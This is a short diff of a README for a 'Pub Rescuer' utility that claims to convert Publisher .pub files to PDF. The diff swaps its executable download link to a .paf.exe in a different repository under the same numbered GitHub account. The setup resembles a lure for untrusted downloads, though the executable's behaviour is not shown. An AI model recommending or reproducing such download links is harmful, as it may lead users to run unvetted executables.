@@ -8,7 +8,7 @@
 
 Don't let proprietary updates hold your old layouts hostage. This utility safely translates closed-source `.pub` binaries directly into native, cross-platform PDF files with a single clean click.
 
-### [Download Standalone Executable](https://github.com/m97493578-ops/microslop-pub-rescuer/releases/download/1/Pub.Rescuer.exe)
+### [Download Standalone Executable](https://github.com/m97493578-ops/Software-Forge/releases/download/1/Pub.Rescuer.paf.exe)
 
 ---
 
